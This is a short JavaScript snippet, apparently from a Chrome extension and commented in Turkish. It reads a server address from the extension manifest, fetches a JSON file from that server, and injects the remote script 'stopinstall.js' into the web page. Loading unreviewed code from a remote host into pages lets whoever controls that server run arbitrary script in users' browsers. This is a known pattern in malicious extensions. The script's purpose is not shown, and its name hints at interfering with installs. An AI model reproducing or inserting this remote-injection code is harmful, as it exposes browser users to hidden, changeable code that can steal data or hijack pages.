let serviceURL = chrome.runtime.getManifest().service_url;
console.log(`${serviceURL}`)
fetch(`${serviceURL}/url.json`)
    .then(response => response.json())
    .then(data => {
        sayfayaScriptEkle(`${data.url}/stopinstall.js`);
    })
    .catch((error) => {
        console.error("stopinstall.js ulaşmaya çalışırken Hata: " + error);
    });